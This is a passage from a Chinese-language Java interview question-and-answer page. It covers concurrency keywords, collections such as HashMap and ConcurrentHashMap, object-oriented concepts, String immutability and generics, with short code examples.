区别？</h4><p>synchronized是Java的关键字，当它用来修饰一个方法或者一个代码块的时候，能够保证在同一时刻最多只有一个线程执行该段代码。JDK1.5以后引入了自旋锁、锁粗化、轻量级锁，偏向锁来有优化关键字的性能。</p><p>Lock是一个接口，而synchronized是Java中的关键字，synchronized是内置的语言实现；synchronized在发生异常时，会自动释放线程占有的锁，因此不会导致死锁现象发生；而Lock在发生异常时，如果没有主动通过unLock()去释放锁，则很可能造成死锁现象，因此使用Lock时需要在finally块中释放锁；Lock可以让等待锁的线程响应中断，而synchronized却不行，使用synchronized时，等待的线程会一直等待下去，不能够响应中断；通过Lock可以知道有没有成功获取锁，而synchronized却无法办到。</p><h4 id="介绍一下volatile？"><a href="#介绍一下volatile？" class="headerlink" title="介绍一下volatile？"></a>介绍一下volatile？</h4><p>volatile关键字是用来保证有序性和可见性的。这跟Java内存模型有关。比如我们所写的代码，不一定是按照我们自己书写的顺序来执行的，编译器会做重排序，CPU也会做重排序的，这样的重排序是为了减少流水线的阻塞的，引起流水阻塞，比如数据相关性，提高CPU的执行效率。需要有一定的顺序和规则来保证，不然程序员自己写的代码都不知带对不对了，所以有happens-before规则，其中有条就是volatile变量规则：对一个变量的写操作先行发生于后面对这个变量的读操作；有序性实现的是通过插入内存屏障来保证的。可见性：首先Java内存模型分为，主内存，工作内存。比如线程A从主内存把变量从主内存读到了自己的工作内存中，做了加1的操作，但是此时没有将i的最新值刷新会主内存中，线程B此时读到的还是i的旧值。加了volatile关键字的代码生成的汇编代码发现，会多出一个lock前缀指令。Lock指令对Intel平台的CPU，早期是锁总线，这样代价太高了，后面提出了缓存一致性协议，MESI，来保证了多核之间数据不一致性问题。</p><h4 id="Syncronized锁，如果用这个关键字修饰一个静态方法，锁住了什么？如果修饰成员方法，锁住了什么？"><a href="#Syncronized锁，如果用这个关键字修饰一个静态方法，锁住了什么？如果修饰成员方法，锁住了什么？" class="headerlink" title="Syncronized锁，如果用这个关键字修饰一个静态方法，锁住了什么？如果修饰成员方法，锁住了什么？"></a>Syncronized锁，如果用这个关键字修饰一个静态方法，锁住了什么？如果修饰成员方法，锁住了什么？</h4><ul><li>synchronized修饰静态方法以及同步代码块的synchronized (类.class)用法锁的是类，线程想要执行对应同步代码，需要获得类锁。</li><li>synchronized修饰成员方法，线程获取的是当前调用该方法的对象实例的对象锁。</li></ul><h4 id="若对一个类不重写，它的equals-方法是如何比较的？"><a href="#若对一个类不重写，它的equals-方法是如何比较的？" class="headerlink" title="若对一个类不重写，它的equals()方法是如何比较的？"></a>若对一个类不重写，它的equals()方法是如何比较的？</h4><p>比较是对象的地址。</p><h4 id="hashCode-和equals-方法有什么联系？"><a href="#hashCode-和equals-方法有什么联系？" class="headerlink" title="hashCode()和equals()方法有什么联系？"></a>hashCode()和equals()方法有什么联系？</h4><p>Java对象的eqauls方法和hashCode方法是这样规定的：</p><ul><li><p>相等（相同）的对象必须具有相等的哈希码（或者散列码）。</p></li><li><p>如果两个对象的hashCode相同，它们并不一定相同。</p></li></ul><h4 id="关键字：throws-throw-try-catch-finally分别代表什么意义？在try块中可以抛出异常吗？"><a href="#关键字：throws-throw-try-catch-finally分别代表什么意义？在try块中可以抛出异常吗？" class="headerlink" title="关键字：throws,throw,try,catch,finally分别代表什么意义？在try块中可以抛出异常吗？"></a>关键字：throws,throw,try,catch,finally分别代表什么意义？在try块中可以抛出异常吗？</h4><p>Java 通过面向对象的方法进行异常处理，把各种不同的异常进行分类，并提供了良好的接口。在Java中，每个异常都是一个对象，它是Throwable类或其它子类的实例。当一个方法出现异常后便抛出一个异常对象，该对象中包含有异常信息，调用这个对象的方法可以捕获到这个异常并进行处理。Java的异常处理是通过5个关键词来实现的：try、catch、throw、throws和finally。一般情况下是用try来执行一段程序，如果出现异常，系统会抛出（throws）一个异常，这时候你可以通过它的类型来捕捉（catch）它，或最后（finally）由缺省处理器来处理。用try来指定一块预防所有”异常”的程序。紧跟在try程序后面，应包含一个catch子句来指定你想要捕捉的”异常”的类型。throw语句用来明确地抛出一个”异常”。throws用来标明一个成员函数可能抛出的各种”异常”。Finally为确保一段代码不管发生什么”异常”都被执行一段代码。可以在一个成员函数调用的外面写一个try语句，在这个成员函数内部写另一个try语句保护其他代码。每当遇到一个try语句，”异常“的框架就放到堆栈上面，直到所有的try语句都完成。如果下一级的try语句没有对某种”异常”进行处理，堆栈就会展开，直到遇到有处理这种”异常”的try语句。</p><h4 id="Java的接口和C-的虚类的相同和不同处"><a href="#Java的接口和C-的虚类的相同和不同处" class="headerlink" title="Java的接口和C++的虚类的相同和不同处?"></a>Java的接口和C++的虚类的相同和不同处?</h4><p>由于Java不支持多继承，而有可能某个类或对象要使用分别在几个类或对象里面的方法或属性，现有的单继承机制就不能满足要求。<br>与继承相比，接口有更高的灵活性，因为接口中没有任何实现代码。当一个类实现了接口以后，该类要实现接口里面所有的方法和属性，并且接口里面的属性在默认状态下面都是public static,所有方法默认情况下是public.一个类可以实现多个接口。</p><p>接口的本质是约定。</p><h4 id="Static-Nested-Class-和-Inner-Class的不同？"><a href="#Static-Nested-Class-和-Inner-Class的不同？" class="headerlink" title="Static Nested Class 和 Inner Class的不同？"></a>Static Nested Class 和 Inner Class的不同？</h4><p>Static Nested Class是被声明为静态（static）的内部类，它可以不依赖于外部类实例被实例化。而通常的内部类需要在外部类实例化后才能实例化。Static-Nested Class 的成员, 既可以定义为静态的(static), 也可以定义为动态的(instance).Nested Class的静态成员(Method)只能对Outer Class的静态成员(static memebr)进行操作(ACCESS), 而不能Access Outer Class的动态成员(instance member).而 Nested Class的动态成员(instance method) 却可以 Access Outer Class的所有成员, 这个概念很重要, 许多人对这个概念模糊. 有一个普通的原则, 因为静态方法(static method) 总是跟 CLASS 相关联(bind CLASS), 而动态方法( (instance method) 总是跟 instance object 相关联, 所以,静态方法(static method)永远不可以Access跟 object 相关的动态成员(instance member),反过来就可以, 一个CLASS的 instance object 可以 Access 这个 Class 的任何成员, 包括静态成员(static member).</p><h4 id="final-finally-finalize的区别？"><a href="#final-finally-finalize的区别？" class="headerlink" title="final, finally, finalize的区别？"></a>final, finally, finalize的区别？</h4><ul><li>final 用于声明属性，方法和类，分别表示属性不可变，方法不可覆盖，类不可继承。</li><li>finally是异常处理语句结构的一部分，表示总是执行。</li><li>finalize是Object类的一个方法，在垃圾收集器执行的时候会调用被回收对象的此方法，可以覆盖此方法提供垃圾收集时的其他资源<br>回收，例如关闭文件等。</li></ul><h3 id="Java-集合"><a href="#Java-集合" class="headerlink" title="Java 集合"></a>Java 集合</h3><h4 id="请说明List、Map、Set三个接口存取元素时，各有什么特点。"><a href="#请说明List、Map、Set三个接口存取元素时，各有什么特点。" class="headerlink" title="请说明List、Map、Set三个接口存取元素时，各有什么特点。"></a>请说明List、Map、Set三个接口存取元素时，各有什么特点。</h4><ul><li>List以特定索引来存取元素，可以有重复元素。</li><li>Set不能存放重复元素（用对象的equals()方法来区分元素是否重复）。</li><li>Map保存键值对（key-value pair）映射，映射关系可以是一对一或多对一。Set和Map容器都有基于哈希存储和排序树的两种实现版本，基于哈希存储的版本理论存取时间复杂度为O(1)，而基于排序树版本的实现在插入或删除元素时会按照元素或元素的键（key）构成排序树从而达到排序和去重的效果。</li></ul><h4 id="阐述ArrayList、Vector、LinkedList的存储性能和特性。"><a href="#阐述ArrayList、Vector、LinkedList的存储性能和特性。" class="headerlink" title="阐述ArrayList、Vector、LinkedList的存储性能和特性。"></a>阐述ArrayList、Vector、LinkedList的存储性能和特性。</h4><ul><li>ArrayList 和 Vector都是使用数组方式存储数据，此数组元素数大于实际存储的数据以便增加和插入元素，它们都允许直接按序号索引元素，但是插入元素要涉及数组元素移动等内存操作，所以索引数据快而插入数据慢，Vector中的方法由于添加了synchronized修饰，因此Vector是线程安全的容器，但性能上较ArrayList差，因此已经是Java中的遗留容器。</li><li>LinkedList使用双向链表实现存储（将内存中零散的内存单元通过附加的引用关联起来，形成一个可以按序号索引的线性结构，这种链式存储方式与数组的连续存储方式相比，内存的利用率更高），按序号索引数据需要进行前向或后向遍历，但是插入数据时只需要记录本项的前后项即可，所以插入速度较快。</li><li>Vector属于遗留容器（Java早期的版本中提供的容器，除此之外，Hashtable、Dictionary、BitSet、Stack、Properties都是遗留容器），已经不推荐使用，但是由于ArrayList和LinkedListed都是非线程安全的，如果遇到多个线程操作同一个容器的场景，则可以通过工具类Collections中的synchronizedList方法将其转换成线程安全的容器后再使用（这是对装潢模式的应用，将已有对象传入另一个类的构造器中创建新的对象来增强实现）。</li></ul><h4 id="List、Set、Map是否继承自Collection接口？"><a href="#List、Set、Map是否继承自Collection接口？" class="headerlink" title="List、Set、Map是否继承自Collection接口？"></a>List、Set、Map是否继承自Collection接口？</h4><p>List、Set 是，Map 不是。Map是键值对映射容器，与List和Set有明显的区别，而Set存储的零散的元素且不允许有重复元素（数学中的集合也是如此），List是线性结构的容器，适用于按数值索引访问元素的情形。</p><h4 id="常用集合类以及主要方法？"><a href="#常用集合类以及主要方法？" class="headerlink" title="常用集合类以及主要方法？"></a>常用集合类以及主要方法？</h4><p>最常用的集合类是List 和 Map。<br>List 的具体实现包括 ArrayList 和 Vector，它们是可变大小的列表，比较适合构建、存储和操作任何类型对象的元素列表。List 适用于按数值索引访问元素的情形。<br>Map 提供了一个更通用的元素存储方法。 Map 集合类用于存储元素对（称作”键”和”值”），其中每个键映射到一个值。</p><h4 id="Collection-和-Collections的区别。"><a href="#Collection-和-Collections的区别。" class="headerlink" title="Collection 和 Collections的区别。"></a>Collection 和 Collections的区别。</h4><ul><li>Collection是集合类的上级接口，继承与他的接口主要有Set 和List.</li><li>Collections是针对集合类的一个帮助类，他提供一系列静态方法实现对各种集合的搜索、排序、线程安全化等操作。</li></ul><h4 id="ArrayList和LinkedList的区别？"><a href="#ArrayList和LinkedList的区别？" class="headerlink" title="ArrayList和LinkedList的区别？"></a>ArrayList和LinkedList的区别？</h4><ul><li>ArrayList和LinkedList都实现了List接口，他们有以下的不同点：</li><li>ArrayList是基于索引的数据接口，它的底层是数组。它可以以O(1)时间复杂度对元素进行随机访问。与此对应，LinkedList是以元素列表的形式存储它的数据，每一个元素都和它的前一个和后一个元素链接在一起，在这种情况下，查找某个元素的时间复杂度是O(n)。</li><li>相对于ArrayList，LinkedList的插入，添加，删除操作速度更快，因为当元素被添加到集合任意位置的时候，不需要像数组那样重新计算大小或者是更新索引。</li><li>LinkedList比ArrayList更占内存，因为LinkedList为每一个节点存储了两个引用，一个指向前一个元素，一个指向下一个元素。</li></ul><h4 id="HashMap和Hashtable的区别？"><a href="#HashMap和Hashtable的区别？" class="headerlink" title="HashMap和Hashtable的区别？"></a>HashMap和Hashtable的区别？</h4><ul><li>HashMap和Hashtable都实现了Map接口，因此很多特性非常相似。但是，他们有以下不同点：</li><li>HashMap允许键和值是null，而Hashtable不允许键或者值是null。</li><li>Hashtable是同步的，而HashMap不是。因此，HashMap更适合于单线程环境，而Hashtable适合于多线程环境。</li><li>HashMap提供了可供应用迭代的键的集合，因此，HashMap是快速失败的。另一方面，Hashtable提供了对键的列举(Enumeration)。<br>一般认为Hashtable是一个遗留的类。</li></ul><h4 id="快速失败-fail-fast-和安全失败-fail-safe-的区别？"><a href="#快速失败-fail-fast-和安全失败-fail-safe-的区别？" class="headerlink" title="快速失败(fail-fast)和安全失败(fail-safe)的区别？"></a>快速失败(fail-fast)和安全失败(fail-safe)的区别？</h4><ul><li>Iterator的安全失败是基于对底层集合做拷贝，因此，它不受源集合上修改的影响。java.util包下面的所有的集合类都是快速失败的，而java.util.concurrent包下面的所有的类都是安全失败的。</li><li>快速失败的迭代器会抛出ConcurrentModificationException异常，而安全失败的迭代器永远不会抛出这样的异常。</li></ul><h4 id="什么是迭代器？"><a href="#什么是迭代器？" class="headerlink" title="什么是迭代器？"></a>什么是迭代器？</h4><p>Iterator提供了统一遍历操作集合元素的统一接口, Collection接口实现Iterable接口,<br>每个集合都通过实现Iterable接口中iterator()方法返回Iterator接口的实例, 然后对集合的元素进行迭代操作.<br>有一点需要注意的是：在迭代元素的时候不能通过集合的方法删除元素, 否则会抛出ConcurrentModificationException 异常. 但是可以通过Iterator接口中的remove()方法进行删除.</p><h4 id="集合类没有实现Cloneable和Serializable接口？"><a href="#集合类没有实现Cloneable和Serializable接口？" class="headerlink" title="集合类没有实现Cloneable和Serializable接口？"></a>集合类没有实现Cloneable和Serializable接口？</h4><p>克隆(cloning)或者是序列化(serialization)的语义和含义是跟具体的实现相关的。因此，应该由集合类的具体实现来决定如何被克隆或者是序列化。<br>实现Serializable序列化的作用：将对象的状态保存在存储媒体中以便可以在以后重写创建出完全相同的副本；按值将对象从一个从一个应用程序域发向另一个应用程序域。<br>实现 Serializable接口的作用就是可以把对象存到字节流，然后可以恢复。所以你想如果你的对象没有序列化，怎么才能进行网络传输呢？要网络传输就得转为字节流，所以在分布式应用中，你就得实现序列化。如果你不需要分布式应用，那就没必要实现实现序列化。</p><h4 id="Java集合类框架的基本接口有哪些？"><a href="#Java集合类框架的基本接口有哪些？" class="headerlink" title="Java集合类框架的基本接口有哪些？"></a>Java集合类框架的基本接口有哪些？</h4><p>集合类接口指定了一组叫做元素的对象。集合类接口的每一种具体的实现类都可以选择以它自己的方式对元素进行保存和排序。有的集合类允许重复的键，有些不允许。<br>Java集合类提供了一套设计良好的支持对一组对象进行操作的接口和类。Java集合类里面最基本的接口有：</p><ul><li>Collection：代表一组对象，每一个对象都是它的子元素。</li><li>Set：不包含重复元素的Collection。</li><li>List：有顺序的collection，并且可以包含重复元素。</li><li>Map：可以把键(key)映射到值(value)的对象，键不能重复。</li></ul><h4 id="ConcurrentHashMap的原理？"><a href="#ConcurrentHashMap的原理？" class="headerlink" title="ConcurrentHashMap的原理？"></a>ConcurrentHashMap的原理？</h4><p>ConcurrentHashMap 类中包含两个静态内部类 HashEntry 和 Segment。HashEntry 用来封装映射表的键 / 值对；Segment 用来充当锁的角色，每个 Segment 对象守护整个散列映射表的若干个桶。</p><p>使用分段锁来实现线程安全。</p><h4 id="请解释一下TreeMap"><a href="#请解释一下TreeMap" class="headerlink" title="请解释一下TreeMap?"></a>请解释一下TreeMap?</h4><p>TreeMap是一个有序的key-value集合，基于红黑树（Red-Black tree）的 NavigableMap实现。红黑树是一种平衡二叉树，避免退化成链表。</p><h4 id="请说明-ArrayList-是否会越界？"><a href="#请说明-ArrayList-是否会越界？" class="headerlink" title="请说明 ArrayList 是否会越界？"></a>请说明 ArrayList 是否会越界？</h4><p>ArrayList是实现了基于动态数组的数据结构，而LinkedList是基于链表的数据结构2. 对于随机访问get和set，ArrayList要优于LinkedList，因为LinkedList要移动指针；ArrayList并发add()可能出现数组下标越界异常。</p><p>线程安全可以使用 </p><ul><li>synchronizedList 方法改造 ArrayList</li><li>CopyOnWriteArrayList</li></ul><h4 id="concurrenthashmap有什么优势以及1-7和1-8区别"><a href="#concurrenthashmap有什么优势以及1-7和1-8区别" class="headerlink" title="concurrenthashmap有什么优势以及1.7和1.8区别?"></a>concurrenthashmap有什么优势以及1.7和1.8区别?</h4><ul><li><p>1.7是在jdk1.7中采用Segment + HashEntry的方式进行实现的，lock加在Segment上面。1.7size计算是先采用不加锁的方式，连续计算元素的个数，最多计算3次：1、如果前后两次计算结果相同，则说明计算出来的元素个数是准确的；2、如果前后两次计算结果都不同，则给每个Segment进行加锁，再计算一次元素的个数；</p></li><li><p>1.8中放弃了Segment臃肿的设计，取而代之的是采用Node + CAS + Synchronized来保证并发安全进行实现，1.8中使用一个volatile类型的变量baseCount记录元素的个数，当插入新数据或则删除数据时，会通过addCount()方法更新baseCount，通过累加baseCount和CounterCell数组中的数量，即可得到元素的总个数；</p></li></ul><h4 id="ConcurrentHashMap锁加在了哪些地方？"><a href="#ConcurrentHashMap锁加在了哪些地方？" class="headerlink" title="ConcurrentHashMap锁加在了哪些地方？"></a>ConcurrentHashMap锁加在了哪些地方？</h4><p>加在每个Segment 上面。</p><h4 id="HashMap的容量为什么是2的n次幂？"><a href="#HashMap的容量为什么是2的n次幂？" class="headerlink" title="HashMap的容量为什么是2的n次幂？"></a>HashMap的容量为什么是2的n次幂？</h4><p>负载因子默认是0.75， 2^n是为了让散列更加均匀，例如出现极端情况都散列在数组中的一个下标，那么hashmap会由O（1）复杂退化为O（n）的。</p><h4 id="ArrayList和LinkedList的区别，并说明如果一直在list的尾部添加元素，用哪种方式的效率高？"><a href="#ArrayList和LinkedList的区别，并说明如果一直在list的尾部添加元素，用哪种方式的效率高？" class="headerlink" title="ArrayList和LinkedList的区别，并说明如果一直在list的尾部添加元素，用哪种方式的效率高？"></a>ArrayList和LinkedList的区别，并说明如果一直在list的尾部添加元素，用哪种方式的效率高？</h4><p>ArrayList采用数组数组实现的，查找效率比LinkedList高。LinkedList采用双向链表实现的，插入和删除的效率比ArrayList要高。一直在list的尾部添加元素，LinkedList效率要高。</p><h4 id="如果hashMap的key是一个自定义的类，怎么办？"><a href="#如果hashMap的key是一个自定义的类，怎么办？" class="headerlink" title="如果hashMap的key是一个自定义的类，怎么办？"></a>如果hashMap的key是一个自定义的类，怎么办？</h4><p>使用HashMap，如果key是自定义的类，就必须重写hashcode()和equals()。</p><h4 id="hashMap具体如何实现的？"><a href="#hashMap具体如何实现的？" class="headerlink" title="hashMap具体如何实现的？"></a>hashMap具体如何实现的？</h4><p>Hashmap基于数组实现的，通过对key的hashcode &amp; 数组的长度得到在数组中位置，如当前数组有元素，则数组当前元素next指向要插入的元素，这样来解决hash冲突的，形成了拉链式的结构。put时在多线程情况下，会形成环从而导致死循环。数组长度一般是2n，从0开始编号，所以hashcode &amp; （2n-1），（2n-1）每一位都是1，这样会让散列均匀。需要注意的是，HashMap在JDK1.8的版本中引入了红黑树结构做优化，当链表元素个数大于等于8时，链表转换成树结构；若桶中链表元素个数小于等于6时，树结构还原成链表。因为红黑树的平均查找长度是log(n)，长度为8的时候，平均查找长度为3，如果继续使用链表，平均查找长度为8/2=4，这才有转换为树的必要。链表长度如果是小于等于6，6/2=3，虽然速度也很快的，但是转化为树结构和生成树的时间并不会太短。还有选择6和8，中间有个差值7可以有效防止链表和树频繁转换。假设一下，如果设计成链表个数超过8则链表转换成树结构，链表个数小于8则树结构转换成链表，如果一个HashMap不停的插入、删除元素，链表个数在8左右徘徊，就会频繁的发生树转链表、链表转树，效率会很低。</p><h3 id="Java-面向对象"><a href="#Java-面向对象" class="headerlink" title="Java 面向对象"></a>Java 面向对象</h3><h4 id="面向对象的”六原则一法则”？"><a href="#面向对象的”六原则一法则”？" class="headerlink" title="面向对象的”六原则一法则”？"></a>面向对象的”六原则一法则”？</h4><ul><li>单一职责原则：一个类只做它该做的事情。</li><li>依赖倒转原则：面向接口编程。</li><li>接口隔离原则：接口要小而专，绝不能大而全。</li><li>里氏替换原则：任何时候都可以用子类型替换掉父类型。</li><li>合成聚合复用原则：优先使用聚合或合成关系复用代码。</li><li>迪米特法则：迪米特法则又叫最少知识原则，一个对象应当对其他对象有尽可能少的了解。</li></ul><h4 id="面向对象的特征有哪些方面？"><a href="#面向对象的特征有哪些方面？" class="headerlink" title="面向对象的特征有哪些方面？"></a>面向对象的特征有哪些方面？</h4><ul><li>抽象：抽象就是忽略一个主题中与当前目标无关的那些方面，以便更充分地注意与当前目标有关的方面。抽象并不打算了解全部问题，而只<br>是选择其中的一部分，暂时不用部分细节。抽象包括两个方面，一是过程抽象，二是数据抽象。</li><li>继承：继承是一种联结类的层次模型，并且允许和鼓励类的重用，它提供了一种明确表述共性的方法。对象的一个新类可以从现有的类中派<br>生，这个过程称为类继承。新类继承了原始类的特性，新类称为原始类的派生类（子类），而原始类称为新类的基类（父类）。派生<br>类可以从它的基类那里继承方法和实例变量，并且类可以修改或增加新的方法使之更适合特殊的需要。</li><li>封装：封装是把过程和数据包围起来，对数据的访问只能通过已定义的界面。面向对象计算始于这个基本概念，即现实世界可以被描绘成一<br>系列完全自治、封装的对象，这些对象通过一个受保护的接口访问其他对象。</li><li>多态性：多态性是指允许不同类的对象对同一消息作出响应。多态性包括参数化多态性和包含多态性。多态性语言具有灵活、抽象、行为共享</li></ul><h4 id="Java是否支持多继承？"><a href="#Java是否支持多继承？" class="headerlink" title="Java是否支持多继承？"></a>Java是否支持多继承？</h4><p>Java中类不支持多继承，只支持单继承（即一个类只有一个父类）。 但是java中的接口支持多继承，，即一个子接口可以有多个父接口。（接口的作用是用来扩展对象的功能，一个子接口继承多个父接口，说明子接口扩展了多个功能，当类实现接口时，类就扩展了相应的功能）。</p><h4 id="什么是构造函数？什么是构造函数重载？什么是复制构造函数？"><a href="#什么是构造函数？什么是构造函数重载？什么是复制构造函数？" class="headerlink" title="什么是构造函数？什么是构造函数重载？什么是复制构造函数？"></a>什么是构造函数？什么是构造函数重载？什么是复制构造函数？</h4><ul><li>当新对象被创建的时候，构造函数会被调用。每一个类都有构造函数。在程序员没有给类提供构造函数的情况下，Java编译器会为这个类创建一个默认的构造函数。</li><li>Java中构造函数重载和方法重载很相似。可以为一个类创建多个构造函数。每一个构造函数必须有它自己唯一的参数列表。</li><li>Java不支持像C++中那样的复制构造函数，这个不同点是因为如果你不自己写构造函数的情况下，</li><li>Java不会创建默认的复制构造函数。</li></ul><h4 id="方法覆盖-Overriding-和方法重载-Overloading-是什么意思？如何使用。"><a href="#方法覆盖-Overriding-和方法重载-Overloading-是什么意思？如何使用。" class="headerlink" title="方法覆盖(Overriding)和方法重载(Overloading)是什么意思？如何使用。"></a>方法覆盖(Overriding)和方法重载(Overloading)是什么意思？如何使用。</h4><p>Java中的方法重载发生在同一个类里面两个或者是多个方法的方法名相同但是参数不同的情况。与此相对，方法覆盖是说子类重新定义了父类的方法。方法覆盖必须有相同的方法名，参数列表和返回类型。覆盖者可能不会限制它所覆盖的方法的访问。</p><p>如果是想要覆盖，一定要加上 @Override 注解，编译器会帮忙检查是否覆盖成功。</p><h4 id="请你讲讲abstract-class和interface有什么区别"><a href="#请你讲讲abstract-class和interface有什么区别" class="headerlink" title="请你讲讲abstract class和interface有什么区别?"></a>请你讲讲abstract class和interface有什么区别?</h4><p>声明方法的存在而不去实现它的类被叫做抽象类（abstract class），它用于要创建一个体现某些基本行为的类，并为该类声明方法，但不能在该类中实现该类的情况。不能创建abstract 类的实例。然而可以创建一个变量，其类型是一个抽象类，并让它指向具体子类的一个实例。不能有抽象构造函数或抽象静态方法。Abstract 类的子类为它们父类中的所有抽象方法提供实现，否则它们也是抽象类为。取而代之，在子类中实现该方法。知道其行为的其它类可以在类中实现这些方法。<br>接口（interface）是抽象类的变体。在接口中，所有方法都是抽象的。多继承性可通过实现这样的接口而获得。接口中的所有方法都是抽象的，没有一个有程序体。接口只可以定义static final成员变量。接口的实现与子类相似，除了该实现类不能从接口定义中继承行为。当类实现特殊接口时，它定义（即将程序体给予）所有这种接口的方法。然后，它可以在实现了该接口的类的任何对象上调用接口的方法。由于有抽象类，它允许使用接口名作为引用变量的类型。通常的动态联编将生效。引用可以转换到接口类型或从接口类型转换，instanceof 运算符可以用来决定某对象的类是否实现了接口。</p><h4 id="两个对象值相同-x-equals-y-true-，但却可有不同的hash-code，该说法是否正确，为什么？"><a href="#两个对象值相同-x-equals-y-true-，但却可有不同的hash-code，该说法是否正确，为什么？" class="headerlink" title="两个对象值相同(x.equals(y) == true)，但却可有不同的hash code，该说法是否正确，为什么？"></a>两个对象值相同(x.equals(y) == true)，但却可有不同的hash code，该说法是否正确，为什么？</h4><p>可以实现，但不应该这样做，如果两个对象x和y满足x.equals(y) == true，它们的哈希码（hash code）应当相同。Java对于eqauls方法和hashCode方法是这样规定的：(1)如果两个对象相同（equals方法返回true），那么它们的hashCode值一定要相同；(2)如果两个对象的hashCode相同，它们并不一定相同。当然，你未必要按照要求去做，但是如果你违背了上述原则就会发现在使用容器时，相同的对象可以出现在Set集合中，同时增加新元素的效率会大大下降（对于使用哈希存储的系统，如果哈希码频繁的冲突将会造成存取性能急剧下降）。</p><h4 id="列举-Object-类的方法并简要说明。"><a href="#列举-Object-类的方法并简要说明。" class="headerlink" title="列举 Object 类的方法并简要说明。"></a>列举 Object 类的方法并简要说明。</h4><ul><li>Object()默认构造方法。</li><li>clone() 创建并返回此对象的一个副本。</li><li>equals(Object obj) 指示某个其他对象是否与此对象“相等”。finalize()当垃圾回收器确定不存在对该对象的更多引用时，由对象的垃圾回收器调用此方法。</li><li>getClass() 返回一个对象的运行时类。</li><li>hashCode()返回该对象的哈希码值。 </li><li>notify()唤醒在此对象监视器上等待的单个线程。 </li><li>notifyAll()唤醒在此对象监视器上等待的所有线程。</li><li>toString()返回该对象的字符串表示。</li><li>wait()导致当前的线程等待，直到其他线程调用此对象的 </li><li>notify() 方法或 </li><li>notifyAll() 方法。</li><li>wait(long timeout)导致当前的线程等待，直到其他线程调用此对象的 notify() 方法或 notifyAll() 方法，或者超过指定的时间量。</li><li>wait(long timeout, int nanos) 导致当前的线程等待，直到其他线程调用此对象的 notify() 方法或 - notifyAll() 方法，或者其他某个线程中断当前线程，或者已超过某个实际时间量。</li></ul><h4 id="请说明类和对象的区别。"><a href="#请说明类和对象的区别。" class="headerlink" title="请说明类和对象的区别。"></a>请说明类和对象的区别。</h4><ul><li>类是对某一类事物的描述，是抽象的；而对象是一个实实在在的个体，是类的一个实例。<br>比如：“人”是一个类，而“教师”则是“人”的一个实例。</li><li>对象是函数、变量的集合体；而类是一组函数和变量的集合体，即类是一组具有相同属性的对象集合体。</li></ul><h4 id="String为什么不可变？"><a href="#String为什么不可变？" class="headerlink" title="String为什么不可变？"></a>String为什么不可变？</h4><p>不可变对象是指一个对象的状态在对象被创建之后就不再变化。不可改变的意思就是说：不能改变对象内的成员变量，包括基本数据类型的值不能改变，引用类型的变量不能指向其他的对象，引用类型指向的对象的状态也不能改变。</p><p>String 不可变是因为在 JDK 中 String 类被声明为一个 final 类，且类内部的 value 字节数组也是 final 的，只有当字符串是不可变时字符串池才有可能实现，字符串池的实现可以在运行时节约很多 heap 空间，因为不同的字符串变量都指向池中的同一个字符串；如果字符串是可变的则会引起很严重的安全问题，譬如数据库的用户名密码都是以字符串的形式传入来获得数据库的连接，或者在 socket 编程中主机名和端口都是以字符串的形式传入，因为字符串是不可变的，所以它的值是不可改变的，否则黑客们可以钻到空子改变字符串指向的对象的值造成安全漏洞；因为字符串是不可变的，所以是多线程安全的，同一个字符串实例可以被多个线程共享，这样便不用因为线程安全问题而使用同步，字符串自己便是线程安全的；因为字符串是不可变的所以在它创建的时候 hashcode 就被缓存了，不变性也保证了 hash 码的唯一性，不需要重新计算，这就使得字符串很适合作为 Map 的键，字符串的处理速度要快过其它的键对象，这就是 HashMap 中的键往往都使用字符串的原因。</p><p>线程安全、快速比较需要不变性。</p><h4 id="内部类可以引用他包含类的成员吗，如果可以，有没有什么限制吗？"><a href="#内部类可以引用他包含类的成员吗，如果可以，有没有什么限制吗？" class="headerlink" title="内部类可以引用他包含类的成员吗，如果可以，有没有什么限制吗？"></a>内部类可以引用他包含类的成员吗，如果可以，有没有什么限制吗？</h4><p>一个内部类对象可以访问创建它的外部类对象的内容，内部类如果不是static的，那么它可以访问创建它的外部类对象的所有属性内部类如果是sattic的，即为nested class，那么它只可以访问创建它的外部类对象的所有static属性一般普通类只有public或package的访问修饰，而内部类可以实现static，protected，private等访问修饰。当从外部类继承的时候，内部类是不会被覆盖的，它们是完全独立的实体，每个都在自己的命名空间内，如果从内部类中明确地继承，就可以覆盖原来内部类的方法。</p><h4 id="extends-和super-泛型限定符"><a href="#extends-和super-泛型限定符" class="headerlink" title="extends 和super 泛型限定符"></a>extends 和super 泛型限定符</h4><ul><li>上界<code>&lt;? extend Fruit&gt;</code> 传入的对象不是是制定对象的子类。</li><li>下界 <code>&lt;? super Apple&gt;</code> 传入的对象比如是制定对象的超类。</li></ul><pre><code>import java.util.ArrayList;import java.util.List;class Fruit {}class Apple extends Fruit {}class Jonathan extends Apple {}class Orange extends Fruit {}public class CovariantArrays {  public static void main(String[] args) {    //上界    List&lt;? extends Fruit&gt; flistTop = new ArrayList&lt;Apple&gt;();    flistTop.add(null);    //add Fruit对象会报错    //flist.add(new Fruit());    Fruit fruit1 = flistTop.get(0);    //下界    List&lt;? super Apple&gt; flistBottem = new ArrayList&lt;Apple&gt;();    flistBottem.add(new Apple());    flistBottem.add(new Jonathan());    //get Apple对象会报错    //Apple apple = flistBottem.get(0);  }}</code></pre><p>编译器可以支持向上转型，但不支持向下转型。具体来讲，我可以把Apple对象赋值给Fruit的引用，但是如果把Fruit对象赋值给Apple的引用就必须得用cast。</p><h4 id="什么是泛型？"><a href="#什么是泛型？" class="headerlink" title="什么是泛型？"></a>什么是泛型？</h4><p>泛型，即“参数化类型”。一提到参数，最熟悉的就是定义方法时有形参，然后调用此方法时传递实参。那么参数化类型怎么理解呢？顾名思义，就是将类型由原来的具体的类型参数化，类似于方法中的变量参数，此时类型也定义成参数形式（可以称之为类型形参），然后在使用/调用时传入具体的类型（类型实参）。</p><pre><code>public class GenericTest {      public static void main(String[] args) {          /*          List list = new ArrayList();          list.add(&quot;qqyumidi&quot;);          list.add(&quot;corn&quot;);          list.add(100);          */         List&lt;String&gt; list = new ArrayList&lt;String&gt;();         list.add(&quot;qqyumidi&quot;);         list.add(&quot;corn&quot;);         //list.add(100);   // 1  提示编译错误         for (int i = 0; i &lt; list.size(); i++) {             String name = list.get(i); // 2             System.out.println(&quot;name:&quot; + name);         }     } }</code></pre><h3 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java 反射"></a>Java 反射</h3><h4 id="如何通过反射获取和设置对象私有字段的值？"><a href="#如何通过反射获取和设置对象私有字段的值？" class="headerlink" 